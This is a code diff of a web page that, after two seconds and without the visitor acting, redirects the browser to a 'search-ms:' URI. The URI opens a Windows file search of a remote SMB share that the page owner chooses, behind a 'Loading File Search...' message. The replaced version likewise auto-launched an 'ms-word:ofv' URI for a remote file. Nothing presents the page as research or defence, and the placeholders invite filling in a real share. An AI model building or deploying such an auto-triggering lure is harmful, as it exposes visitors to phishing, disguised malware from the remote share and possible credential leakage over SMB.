@@ -1,15 +1,27 @@
 <!DOCTYPE html>
 <html>
+<head>
+  <title>Trigger Search-MS for PDF</title>
+</head>
 <body>
-  <p>Click below to open the PDF in Word, or it will open automatically in 5 seconds.</p>
-  <button onclick="openPDF()">Open Now</button>
+  <h1>Loading File Search...</h1>
+  <p>If the search doesn’t open, <a href="https://yourdomain.com/sample.pdf">click here to view the PDF</a>.</p>
+  <button onclick="openSearch()">Open Search Now</button>
   <script>
-    const msUri = "ms-word:ofv|u|https://yourdomain.com/sample.pdf";
-    function openPDF() {
-      window.location.href = msUri;
+    function openSearch() {
+      // Replace with your SMB share path and desired search term
+      const searchUri = "search-ms:query=sample&crumb=location:\\\\yourserver\\public";
+      try {
+        window.location.href = searchUri;
+        setTimeout(() => {
+          alert("If the search didn’t open, ensure you have access to the file share or use the link above.");
+        }, 3000);
+      } catch (e) {
+        alert("Error: " + e.message);
+      }
     }
-    // Auto-trigger after 5 seconds
-    setTimeout(openPDF, 5000);
+    // Auto-trigger after 2 seconds
+    setTimeout(openSearch, 2000);
   </script>
 </body>
 </html>
